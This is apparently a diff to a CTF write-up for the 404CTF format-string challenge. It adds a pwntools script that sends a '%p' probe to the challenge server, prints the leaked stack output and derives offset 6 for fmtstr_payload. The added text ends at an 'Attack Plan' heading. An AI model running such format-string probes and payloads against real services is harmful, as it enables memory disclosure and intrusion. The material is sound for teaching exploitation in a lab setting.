@@ -91,6 +91,148 @@ And voila, we have a format string vulnerability inside the write_quote function
 
 ## Exploitation
 
+### Get the necessary information to exploit the Format String vulnerability
+
+I wrote a piece of code for this
+
+```python
+from pwn import *
+# p = process("./une_citation_pas_comme_les_autres_1_2")
+p = remote("challenges.404ctf.fr", 31719)
+
+p.sendlineafter(b'>>> ',b'2')
+p.recvuntil(b"[Vous] :")
+
+p32_A = b"A"*32
+p500_p = b" %p" * 100
+p.sendline(p32_A + p500_p)
+p.recvuntil(b': ')
+result = str(p.recvline()).split(' ')
+for i in range(len(result)):
+	print("[" + str(i) + "]: " + result[i])
+	
+p.recvuntil(b'>>>')
+p.close()
+```
+
+```shell
+$ python3 fuzz.py
+[+] Starting local process './une_citation_pas_comme_les_autres_1_2': pid 10245
+[0]: b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+[1]: 0x7ffd3bf1ba80
+[2]: (nil)
+[3]: (nil)
+[4]: 0xb7c72d
+[5]: (nil)
+[6]: 0x4141414141414141
+[7]: 0x4141414141414141
+[8]: 0x4141414141414141
+[9]: 0x4141414141414141
+[10]: 0x2520702520702520
+[11]: 0x2070252070252070
+[12]: 0x7025207025207025
+[13]: 0x2520702520702520
+[14]: 0x2070252070252070
+[15]: 0x7025207025207025
+[16]: 0x2520702520702520
+[17]: 0x2070252070252070
+[18]: 0x7025207025207025
+[19]: 0x2520702520702520
+[20]: 0x2070252070252070
+[21]: 0x7025207025207025
+[22]: 0x2520702520702520
+[23]: 0x2070252070252070
+[24]: 0x7025207025207025
+[25]: 0x2520702520702520
+[26]: 0x2070252070252070
+[27]: 0x7025207025207025
+[28]: 0x2520702520702520
+[29]: 0x2070252070252070
+[30]: 0x7025207025207025
+[31]: 0x2520702520702520
+[32]: 0x2070252070252070
+[33]: 0x7025207025207025
+[34]: 0x2520702520702520
+[35]: 0x2070252070252070
+[36]: 0x7025207025207025
+[37]: 0x2520702520702520
+[38]: 0x2070252070252070
+[39]: 0x7025207025207025
+[40]: 0x2520702520702520
+[41]: 0x2070252070252070
+[42]: 0x7025207025207025
+[43]: 0x2520702520702520
+[44]: 0x2070252070252070
+[45]: 0x7025207025207025
+[46]: 0x2520702520702520
+[47]: 0xa70252070
+[48]: 0x4
+[49]: 0x4
+[50]: 0x1
+[51]: 0x416bb1
+[52]: (nil)
+[53]: 0x7ffd3bf1be50
+[54]: 0x4
+[55]: 0x7ffd3bf1bf00
+[56]: 0x7ffd3bf1be80
+[57]: 0x4bdf20
+[58]: 0x1
+[59]: 0x451193
+[60]: 0x7ffd3bf1be50
+[61]: 0x48f23d
+[62]: 0x7ffd3bf1bf50
+[63]: (nil)
+[64]: 0x7ffd3bf1be50
+[65]: 0x451284
+[66]: 0x4bc3c0
+[67]: 0x408fa9
+[68]: (nil)
+[69]: 0x476257
+[70]: 0xb7bfe0
+[71]: 0x68308f53
+[72]: 0x7ffd3bf6e1a0
+[73]: 0x7ffd3bf6e1c8
+[74]: 0x7ffd3bf1be80
+[75]: 0x7ffd3bf1be80
+[76]: 0x7ffd3bf1bf00
+[77]: 0x4
+[78]: 0x4
+[79]: 0x4bc3c0
+[80]: 0x7ffd203e3e3e
+[81]: (nil)
+[82]: (nil)
+[83]: 0x49222d
+[84]: 0x7ffd3bf1c070
+[85]: 0x7ffd3bf1bfe0
+[86]: 0x7ffd3bf1bfd8
+[87]: 0x1a0c23d
+[88]: 0xb7c008
+[89]: 0x1
+[90]: (nil)
+[91]: (nil)
+[92]: (nil)
+[93]: (nil)
+[94]: (nil)
+[95]: (nil)
+[96]: (nil)
+[97]: 0xa5710a40326cbb00
+[98]: (nil)
+[99]: 0x7ffd3bf1c228
+[100]: 0x7ffd3bf1c218\n'
+[*] Stopped process './une_citation_pas_comme_les_autres_1_2' (pid 10245)
+```
+
+As a result, we can see that the numbers 0x41 appear at the 6th position which says that we can control the value at these positions.
+
+So when we use the function
+
+`pwnlib.fmtstr.fmtstr_payload(offset, writes, numbwritten=0, write_size='byte')→ str`
+
+because offset(int) is the offset of the first formatter we control, so our command will be
+
+`fmtstr_payload(6, writes, write_size='byte')`
+
+### Attack Plan
 
 The only function that lets us read the file now is the `pick_quote` function. So we need to exploit this function (make it behave erratically, of course). So how to make it act abnormally?
 
